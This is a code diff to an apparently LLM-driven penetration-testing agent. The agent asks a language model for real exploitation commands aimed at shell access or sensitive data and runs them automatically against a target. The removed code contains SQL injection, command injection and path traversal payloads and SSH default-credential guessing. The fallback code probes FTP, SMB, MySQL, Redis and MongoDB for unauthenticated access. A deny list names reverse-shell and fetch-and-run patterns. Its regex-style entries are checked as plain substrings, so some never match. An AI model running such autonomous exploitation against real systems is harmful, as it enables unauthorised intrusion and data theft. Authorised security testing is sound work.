@@ -419,20 +419,115 @@ class ExploitAgent(Agent):
         from shakka.core.executor import CommandExecutor
         self._executor = CommandExecutor(default_timeout=120)
     
+    async def _generate_exploit_commands(
+        self,
+        target: str,
+        vulnerabilities: list,
+        recommended_exploits: list,
+        ports: list,
+        raw_output: str,
+    ) -> list:
+        """Use LLM to generate specific exploit commands for the target.
+        
+        Args:
+            target: Target IP/hostname.
+            vulnerabilities: Identified vulnerabilities.
+            recommended_exploits: Suggested exploits.
+            ports: Open ports with service info.
+            raw_output: Raw nmap output for context.
+            
+        Returns:
+            List of exploit commands to try.
+        """
+        # Build services info
+        services_info = ""
+        for port in ports:
+            version = port.get('version', 'unknown version')
+            services_info += f"  - {port.get('port')}/{port.get('protocol')}: {port.get('service')} ({version})\n"
+        
+        vulns_info = json.dumps(vulnerabilities, indent=2) if vulnerabilities else "None identified"
+        exploits_info = json.dumps(recommended_exploits, indent=2) if recommended_exploits else "None suggested"
+        
+        prompt = f"""You are a penetration testing expert. Based on the following scan results, generate SPECIFIC exploitation commands that can be run on a Linux system.
+
+TARGET: {target}
+
+OPEN PORTS AND SERVICES:
+{services_info}
+
+IDENTIFIED VULNERABILITIES:
+{vulns_info}
+
+SUGGESTED EXPLOITS:
+{exploits_info}
+
+RAW NMAP OUTPUT (partial):
+{raw_output[:2000]}
+
+Generate a list of practical exploitation commands. For each command:
+1. Use tools commonly available on Kali/Parrot (curl, nikto, sqlmap, hydra, nmap scripts, searchsploit, nuclei, etc.)
+2. Include the actual target IP/hostname and port in the command
+3. Focus on exploits likely to give shell access or sensitive data
+4. Order by likelihood of success (most likely first)
+
+IMPORTANT RULES:
+- Generate REAL, EXECUTABLE commands - not pseudocode
+- Use the exact target: {target}
+- Include proper timeouts to avoid hanging
+- Maximum 10 commands
+- Focus on the specific services and versions found
+
+Respond as JSON array:
+[
+  {{
+    "command": "the actual command to run",
+    "description": "what this tests/exploits",
+    "service": "which service this targets",
+    "port": port_number,
+    "success_indicators": ["strings that indicate success", "like 'uid=' or 'root:'"],
+    "timeout": seconds_to_wait
+  }}
+]
+
+Only output the JSON array, no other text."""
+
+        try:
+            response = await self._call_llm(prompt, None)
+            
+            # Parse response
+            import re
+            if "```json" in response:
+                json_match = re.search(r"```json\s*(.*?)\s*```", response, re.DOTALL)
+                if json_match:
+                    response = json_match.group(1)
+            elif "```" in response:
+                json_match = re.search(r"```\s*(.*?)\s*```", response, re.DOTALL)
+                if json_match:
+                    response = json_match.group(1)
+            
+            commands = json.loads(response)
+            return commands if isinstance(commands, list) else []
+            
+        except Exception as e:
+            self._log_event("exploit_generation_failed", {"error": str(e)})
+            return []
+    
     async def _attempt_exploitation(
         self, 
         target: str, 
         vulnerabilities: list, 
         recommended_exploits: list,
-        ports: list
+        ports: list,
+        raw_output: str = "",
     ) -> dict:
-        """Attempt actual exploitation based on analysis.
+        """Attempt actual exploitation using LLM-generated commands.
         
         Args:
             target: Target IP/hostname.
             vulnerabilities: List of identified vulnerabilities.
             recommended_exploits: List of recommended exploits.
             ports: List of open ports with service info.
+            raw_output: Raw nmap output for context.
             
         Returns:
             Dict with exploitation results.
@@ -442,142 +537,100 @@ class ExploitAgent(Agent):
             "successful": [],
             "failed": [],
             "shells_obtained": [],
+            "data_obtained": [],
         }
         
-        # Build port to service mapping
-        port_services = {p.get("port"): p for p in ports}
+        # Generate dynamic exploit commands using LLM
+        exploit_commands = await self._generate_exploit_commands(
+            target=target,
+            vulnerabilities=vulnerabilities,
+            recommended_exploits=recommended_exploits,
+            ports=ports,
+            raw_output=raw_output,
+        )
         
-        for vuln in vulnerabilities:
-            if not vuln.get("exploitable"):
+        if not exploit_commands:
+            # Fallback to basic enumeration if LLM fails
+            exploit_commands = self._get_fallback_commands(target, ports)
+        
+        self._log_event("exploitation_started", {
+            "target": target,
+            "commands_to_try": len(exploit_commands),
+        })
+        
+        for cmd_info in exploit_commands:
+            command = cmd_info.get("command", "")
+            description = cmd_info.get("description", "Unknown exploit")
+            service = cmd_info.get("service", "unknown")
+            port = cmd_info.get("port", 0)
+            success_indicators = cmd_info.get("success_indicators", [])
+            timeout = min(cmd_info.get("timeout", 30), 120)  # Cap at 2 minutes
+            
+            if not command:
                 continue
-                
-            port = vuln.get("port")
-            service = vuln.get("service", "").lower()
-            cve = vuln.get("cve", "")
+            
+            # Safety check - skip obviously dangerous commands
+            if self._is_dangerous_command(command):
+                self._log_event("dangerous_command_skipped", {"command": command})
+                continue
             
             exploit_attempt = {
-                "vulnerability": vuln,
-                "commands_run": [],
+                "command": command,
+                "description": description,
+                "service": service,
+                "port": port,
                 "output": "",
                 "success": False,
             }
             
             try:
-                # HTTP-based exploits
-                if service in ["http", "https", "http-proxy"] or port in [80, 443, 8080, 8443]:
-                    protocol = "https" if port == 443 or service == "https" else "http"
-                    base_url = f"{protocol}://{target}:{port}"
-                    
-                    # Test for common web vulnerabilities
-                    
-                    # 1. Check for SQL injection
-                    sqli_test = await self._executor.execute(
-                        f"curl -s -o /dev/null -w '%{{http_code}}' '{base_url}/?id=1%27%20OR%20%271%27=%271'",
-                        timeout=15
-                    )
-                    exploit_attempt["commands_run"].append(f"SQL injection test on {base_url}")
-                    
-                    # 2. Check for command injection  
-                    cmd_test = await self._executor.execute(
-                        f"curl -s '{base_url}/?cmd=id' 2>/dev/null | head -20",
-                        timeout=15
-                    )
-                    if "uid=" in cmd_test.stdout:
+                self._log_event("running_exploit", {"command": command[:100]})
+                
+                result = await self._executor.execute(command, timeout=timeout)
+                
+                exploit_attempt["output"] = result.stdout[:2000] if result.stdout else ""
+                if result.stderr:
+                    exploit_attempt["output"] += f"\nSTDERR: {result.stderr[:500]}"
+                
+                # Check for success indicators
+                output_lower = (result.stdout or "").lower()
+                for indicator in success_indicators:
+                    if indicator.lower() in output_lower:
                         exploit_attempt["success"] = True
-                        exploit_attempt["output"] = f"Command injection found! Output: {cmd_test.stdout[:500]}"
-                        results["successful"].append(exploit_attempt)
+                        break
+                
+                # Also check common success patterns
+                common_success = [
+                    "uid=", "root:", "password", "credentials", 
+                    "access granted", "logged in", "welcome",
+                    "shell", "flag{", "ctf{", "admin",
+                ]
+                for pattern in common_success:
+                    if pattern in output_lower:
+                        exploit_attempt["success"] = True
+                        break
+                
+                if exploit_attempt["success"]:
+                    results["successful"].append(exploit_attempt)
+                    
+                    # Categorize the success
+                    if "uid=" in output_lower or "shell" in description.lower():
                         results["shells_obtained"].append({
-                            "type": "command_injection",
-                            "url": f"{base_url}/?cmd=<command>",
+                            "type": service,
+                            "command": command,
                             "target": target,
                             "port": port,
+                            "output": result.stdout[:500],
                         })
-                        continue
-                    
-                    # 3. Check for directory traversal
-                    traversal_test = await self._executor.execute(
-                        f"curl -s '{base_url}/..%2f..%2f..%2f..%2fetc/passwd' 2>/dev/null | head -5",
-                        timeout=15
-                    )
-                    if "root:" in traversal_test.stdout:
-                        exploit_attempt["success"] = True
-                        exploit_attempt["output"] = f"Directory traversal found! /etc/passwd accessible"
-                        results["successful"].append(exploit_attempt)
-                        continue
-                    
-                    # 4. Try nikto for quick web scan if available
-                    nikto_check = await self._executor.execute("which nikto", timeout=5)
-                    if nikto_check.success and nikto_check.stdout.strip():
-                        nikto_result = await self._executor.execute(
-                            f"nikto -h {base_url} -maxtime 30s 2>/dev/null | head -50",
-                            timeout=45
-                        )
-                        if nikto_result.stdout:
-                            exploit_attempt["output"] += f"\nNikto scan: {nikto_result.stdout[:1000]}"
-                    
-                # SSH exploits
-                elif service == "ssh" or port == 22:
-                    # Try common default credentials
-                    default_creds = [
-                        ("root", "root"),
-                        ("admin", "admin"),
-                        ("root", "toor"),
-                        ("user", "user"),
-                    ]
-                    
-                    for username, password in default_creds:
-                        ssh_test = await self._executor.execute(
-                            f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
-                            f"{username}@{target} 'id' 2>/dev/null",
-                            timeout=10
-                        )
-                        exploit_attempt["commands_run"].append(f"SSH login attempt: {username}:{password}")
-                        
-                        if ssh_test.success and "uid=" in ssh_test.stdout:
-                            exploit_attempt["success"] = True
-                            exploit_attempt["output"] = f"SSH access with {username}:{password}! {ssh_test.stdout}"
-                            results["successful"].append(exploit_attempt)
-                            results["shells_obtained"].append({
-                                "type": "ssh",
-                                "credentials": f"{username}:{password}",
-                                "target": target,
-                                "port": port,
-                            })
-                            break
-                
-                # FTP exploits
-                elif service == "ftp" or port == 21:
-                    # Check for anonymous login
-                    ftp_test = await self._executor.execute(
-                        f"curl -s --connect-timeout 5 'ftp://anonymous:anonymous@{target}/' 2>/dev/null | head -20",
-                        timeout=15
-                    )
-                    exploit_attempt["commands_run"].append("FTP anonymous login test")
-                    
-                    if ftp_test.success and ftp_test.stdout:
-                        exploit_attempt["success"] = True
-                        exploit_attempt["output"] = f"Anonymous FTP access! Listing: {ftp_test.stdout[:500]}"
-                        results["successful"].append(exploit_attempt)
-                        continue
-                
-                # SMB exploits  
-                elif service == "smb" or service == "microsoft-ds" or port in [445, 139]:
-                    # Check for null session
-                    smb_test = await self._executor.execute(
-                        f"smbclient -N -L //{target}/ 2>/dev/null | head -20",
-                        timeout=15
-                    )
-                    exploit_attempt["commands_run"].append("SMB null session test")
-                    
-                    if smb_test.stdout and "Sharename" in smb_test.stdout:
-                        exploit_attempt["success"] = True
-                        exploit_attempt["output"] = f"SMB null session! Shares: {smb_test.stdout[:500]}"
-                        results["successful"].append(exploit_attempt)
-                        continue
-                
-                if not exploit_attempt["success"]:
+                    else:
+                        results["data_obtained"].append({
+                            "type": service,
+                            "description": description,
+                            "data": result.stdout[:1000],
+                        })
+                else:
                     results["failed"].append(exploit_attempt)
-                    
+                
             except Exception as e:
                 exploit_attempt["output"] = f"Error: {str(e)}"
                 results["failed"].append(exploit_attempt)
@@ -585,6 +638,149 @@ class ExploitAgent(Agent):
             results["attempted"].append(exploit_attempt)
         
         return results
+    
+    def _get_fallback_commands(self, target: str, ports: list) -> list:
+        """Generate fallback exploitation commands when LLM fails.
+        
+        Args:
+            target: Target IP/hostname.
+            ports: List of open ports.
+            
+        Returns:
+            List of basic exploitation commands.
+        """
+        commands = []
+        
+        for port_info in ports:
+            port = port_info.get("port")
+            service = port_info.get("service", "").lower()
+            
+            # Web services
+            if service in ["http", "https"] or port in [80, 443, 8080, 8443, 3000, 3001]:
+                protocol = "https" if port == 443 else "http"
+                commands.extend([
+                    {
+                        "command": f"curl -s -I {protocol}://{target}:{port}/ | head -20",
+                        "description": "HTTP header reconnaissance",
+                        "service": service,
+                        "port": port,
+                        "success_indicators": ["200 OK", "Server:"],
+                        "timeout": 10,
+                    },
+                    {
+                        "command": f"curl -s '{protocol}://{target}:{port}/robots.txt' 2>/dev/null",
+                        "description": "Check robots.txt for hidden paths",
+                        "service": service,
+                        "port": port,
+                        "success_indicators": ["Disallow:", "User-agent:"],
+                        "timeout": 10,
+                    },
+                    {
+                        "command": f"curl -s '{protocol}://{target}:{port}/?id=1%27%20OR%20%271%27=%271' 2>/dev/null | head -30",
+                        "description": "Basic SQL injection test",
+                        "service": service,
+                        "port": port,
+                        "success_indicators": ["error", "sql", "mysql", "syntax"],
+                        "timeout": 15,
+                    },
+                ])
+            
+            # SSH
+            elif service == "ssh" or port == 22:
+                commands.append({
+                    "command": f"ssh-audit {target} 2>/dev/null | head -30 || nmap -p {port} --script ssh-auth-methods {target}",
+                    "description": "SSH security audit",
+                    "service": "ssh",
+                    "port": port,
+                    "success_indicators": ["weak", "vulnerable", "password"],
+                    "timeout": 30,
+                })
+            
+            # FTP
+            elif service == "ftp" or port == 21:
+                commands.append({
+                    "command": f"curl -s 'ftp://anonymous:anonymous@{target}/' 2>/dev/null | head -20",
+                    "description": "FTP anonymous access test",
+                    "service": "ftp",
+                    "port": port,
+                    "success_indicators": ["drwx", "-rw", "total"],
+                    "timeout": 15,
+                })
+            
+            # SMB
+            elif service in ["smb", "microsoft-ds", "netbios-ssn"] or port in [445, 139]:
+                commands.append({
+                    "command": f"smbclient -N -L //{target}/ 2>/dev/null | head -30",
+                    "description": "SMB null session enumeration",
+                    "service": "smb",
+                    "port": port,
+                    "success_indicators": ["Sharename", "IPC$", "ADMIN$"],
+                    "timeout": 20,
+                })
+            
+            # MySQL
+            elif service == "mysql" or port == 3306:
+                commands.append({
+                    "command": f"mysql -h {target} -u root --connect-timeout=5 -e 'SELECT version();' 2>/dev/null",
+                    "description": "MySQL root no-password test",
+                    "service": "mysql",
+                    "port": port,
+                    "success_indicators": ["version", "MariaDB", "MySQL"],
+                    "timeout": 10,
+                })
+            
+            # Redis
+            elif service == "redis" or port == 6379:
+                commands.append({
+                    "command": f"redis-cli -h {target} -p {port} INFO 2>/dev/null | head -20",
+                    "description": "Redis unauthenticated access",
+                    "service": "redis",
+                    "port": port,
+                    "success_indicators": ["redis_version", "connected_clients"],
+                    "timeout": 10,
+                })
+            
+            # MongoDB
+            elif service == "mongodb" or port == 27017:
+                commands.append({
+                    "command": f"mongosh --host {target} --eval 'db.adminCommand({{listDatabases:1}})' 2>/dev/null | head -20",
+                    "description": "MongoDB unauthenticated access",
+                    "service": "mongodb",
+                    "port": port,
+                    "success_indicators": ["databases", "name", "sizeOnDisk"],
+                    "timeout": 15,
+                })
+        
+        return commands
+    
+    def _is_dangerous_command(self, command: str) -> bool:
+        """Check if a command is too dangerous to execute.
+        
+        Args:
+            command: Command string to check.
+            
+        Returns:
+            True if command should be skipped.
+        """
+        dangerous_patterns = [
+            "rm -rf",
+            "mkfs",
+            "> /dev/",
+            "dd if=",
+            ":(){:|:&};:",  # Fork bomb
+            "chmod -R 777 /",
+            "wget.*|.*bash",
+            "curl.*|.*sh",
+            "nc.*-e",
+            "/dev/tcp",
+        ]
+        
+        command_lower = command.lower()
+        for pattern in dangerous_patterns:
+            if pattern.lower() in command_lower:
+                return True
+        
+        return False
     
     def _extract_real_recon_data(self, context: Optional[dict]) -> dict:
         """Extract real recon data from previous results.
@@ -739,18 +935,21 @@ Potential Exploits: {exploit_count}
                     vulnerabilities=data.get("vulnerabilities", []),
                     recommended_exploits=data.get("recommended_exploits", []),
                     ports=ports,
+                    raw_output=raw_output,
                 )
                 
                 # Update output with exploitation results
                 successful_count = len(exploitation_results.get("successful", []))
                 shells_count = len(exploitation_results.get("shells_obtained", []))
+                data_count = len(exploitation_results.get("data_obtained", []))
                 
                 output += f"""
 
 --- EXPLOITATION RESULTS ---
 Exploits Attempted: {len(exploitation_results.get('attempted', []))}
 Successful Exploits: {successful_count}
-Shells Obtained: {shells_count}"""
+Shells Obtained: {shells_count}
+Data Leaks Found: {data_count}"""
 
                 if shells_count > 0:
                     output += "\n\n🎯 ACCESS OBTAINED:"
@@ -758,8 +957,13 @@ Shells Obtained: {shells_count}"""
                         output += f"\n  • {shell.get('type')}: {shell.get('target')}:{shell.get('port')}"
                         if shell.get('credentials'):
                             output += f" ({shell.get('credentials')})"
-                        if shell.get('url'):
-                            output += f" - {shell.get('url')}"
+                        if shell.get('command'):
+                            output += f"\n    Command: {shell.get('command')[:80]}"
+                
+                if data_count > 0:
+                    output += "\n\n📄 DATA OBTAINED:"
+                    for data_item in exploitation_results.get("data_obtained", [])[:5]:
+                        output += f"\n  • {data_item.get('description', 'Unknown')}"
 
             return AgentResult(
                 success=True,
